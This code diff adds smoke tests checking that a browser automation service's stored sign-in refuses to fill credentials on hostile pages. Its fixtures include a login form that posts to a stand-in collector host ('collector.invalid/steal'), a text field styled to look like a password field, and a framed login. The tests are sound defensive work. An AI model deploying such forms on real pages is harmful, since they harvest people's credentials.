@@ -1,4 +1,5 @@
 import assert from 'node:assert/strict'
+import { randomUUID } from 'node:crypto'
 import { fillablePdfFixture } from './fixtures/fillablePdf'
 import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs'
 import { createServer, type Server } from 'node:http'
@@ -140,6 +141,20 @@ function hasRedAt(path: string, fromX: number, toX: number): boolean {
   return false
 }
 
+/** Sign-in fixtures: an honest form, and each way a page could try to misuse a stored sign-in. */
+function loginHtml(variant: string, frameOrigin: string): string {
+  const field = (type: string, id: string, label: string, extra = ''): string =>
+    `<label for="${id}">${label}</label><input id="${id}" name="${id}" type="${type}" ${extra}>`
+  const forms: Record<string, string> = {
+    login: `<form id="login" method="post" action="/signed-in">${field('text', 'username', 'Username', 'autocomplete="username"')}${field('password', 'password', 'Password', 'autocomplete="current-password"')}<button id="reveal" type="button" onclick="document.querySelector('#password').type = 'text'">Show password</button><button type="submit">Sign in</button></form>`,
+    elsewhere: `<form method="post" action="https://collector.invalid/steal">${field('text', 'username', 'Username')}${field('password', 'password', 'Password')}</form>`,
+    disguised: `<form method="post" action="/signed-in">${field('text', 'username', 'Username')}${field('text', 'password', 'Password', 'style="-webkit-text-security: disc"')}</form>`,
+    framed: `<iframe title="Sign in" src="${frameOrigin}/login" width="600" height="400"></iframe>`,
+    step: `<form method="post" action="/login">${field('email', 'email', 'Email', 'autocomplete="username"')}<button type="submit">Next</button></form>`
+  }
+  return `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Sign in fixture</title></head><body><main>${forms[variant] ?? forms.login}</main></body></html>`
+}
+
 function popupHtml(): string {
   return `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Smoke Popup</title></head><body><main><h1>Popup ready</h1></main><script>console.info('sidekick-native-browser-popup-ready')</script></body></html>`
 }
@@ -155,7 +170,10 @@ async function listen(server: Server): Promise<number> {
 }
 
 async function closeServer(server: Server): Promise<void> {
-  await new Promise<void>((resolvePromise) => server.close(() => resolvePromise()))
+  const closed = new Promise<void>((resolvePromise) => server.close(() => resolvePromise()))
+  // Chromium can keep an idle keep-alive socket open after its page is gone, which close() waits on.
+  server.closeAllConnections()
+  await closed
 }
 
 async function waitFor<T>(
@@ -248,6 +266,19 @@ async function runSmoke(): Promise<SmokeResult> {
       }
       if (requestUrl.pathname === '/drop') {
         request.socket.destroy()
+        return
+      }
+      if (requestUrl.pathname.startsWith('/login') || requestUrl.pathname === '/signed-in') {
+        response.statusCode = 200
+        response.setHeader('content-type', 'text/html; charset=utf-8')
+        response.end(
+          requestUrl.pathname === '/signed-in'
+            ? '<!doctype html><title>Signed in</title><h1>Signed in</h1>'
+            : loginHtml(
+                requestUrl.pathname.slice('/login'.length).replace(/^-/, '') || 'login',
+                `http://localhost:${(request.socket.localPort ?? 0).toString()}`
+              )
+        )
         return
       }
       response.statusCode = 200
@@ -924,6 +955,76 @@ async function runSmoke(): Promise<SmokeResult> {
     assert.deepEqual(isolatedStorage.value, { local: null, cookie: '' })
     await service.close({ sessionId: isolatedSession.sessionId })
     progress('Ephemeral session partition isolation passed')
+
+    progress('Checking stored sign-in boundaries')
+    // A generated value: no real credential appears in any test.
+    const signInPassword = `smoke-${randomUUID()}`
+    const signInUser = 'smoke-user'
+    const origin = new URL(baseUrl).origin
+    const signIn = (sessionId: string, extra: Partial<Parameters<typeof service.signIn>[0]> = {}) =>
+      service!.signIn({
+        sessionId,
+        username: signInUser,
+        password: signInPassword,
+        allowedOrigins: [origin],
+        ...extra
+      })
+    // One session, navigated between fixtures: opening a session per fixture costs seconds each.
+    const login = await service.open({ runId: 'sign-in-smoke', url: `${baseUrl}/login` })
+    const visit = (path: string) =>
+      service!.navigate({ sessionId: login.sessionId, url: `${baseUrl}${path}` })
+    await assert.rejects(
+      signIn(login.sessionId, { allowedOrigins: ['https://example.com'] }),
+      /only on/
+    )
+    const signedIn = await signIn(login.sessionId)
+    assert.deepEqual(signedIn.filled, ['username', 'password'])
+    assert.equal(signedIn.observation.screenshot, undefined)
+    assert.equal(JSON.stringify(signedIn).includes(signInPassword), false)
+    await assert.rejects(
+      service.evaluate({
+        sessionId: login.sessionId,
+        expression: `document.querySelector('#password').value`
+      }),
+      /unavailable while a stored password is filled in/
+    )
+    assert.ok((await service.screenshot({ sessionId: login.sessionId })).bytes > 0)
+    await service.click({ sessionId: login.sessionId, target: { selector: '#reveal' } })
+    await assert.rejects(service.screenshot({ sessionId: login.sessionId }), /shown as plain text/)
+    const revealed = await service.observe(login.sessionId)
+    assert.equal(revealed.screenshot, undefined)
+    assert.match(revealed.screenshotError ?? '', /shown as plain text/)
+
+    await visit('/login')
+    const submitted = await signIn(login.sessionId, { submit: true })
+    assert.equal(submitted.submitted, true)
+    await waitFor(
+      async () => (await service!.observe(login.sessionId, { screenshot: 'none' })).tab,
+      (tab) => tab.title === 'Signed in',
+      'the signed-in page'
+    )
+    // The password left with the page it was typed into.
+    await service.evaluate({ sessionId: login.sessionId, expression: '1' })
+
+    const refused = async (path: string, expected: RegExp, extra = {}) => {
+      await visit(path)
+      await assert.rejects(signIn(login.sessionId, extra), expected)
+      const leaked = await service!.evaluate({
+        sessionId: login.sessionId,
+        expression: `Array.from(document.querySelectorAll('input')).some((field) => field.value === ${JSON.stringify(signInPassword)})`
+      })
+      assert.equal(leaked.value, false, path)
+    }
+    await refused('/login-elsewhere', /sends to another site/)
+    await refused('/login-disguised', /only into a password field/, {
+      passwordTarget: { selector: '#password' }
+    })
+    await refused('/login-framed', /No sign-in field/)
+    await visit('/login-step')
+    const stepped = await signIn(login.sessionId)
+    assert.deepEqual(stepped.filled, ['username'])
+    await service.close({ sessionId: login.sessionId })
+    progress('Stored sign-in boundaries passed')
 
     const fullPage = await service.screenshot({
       sessionId: opened.sessionId,
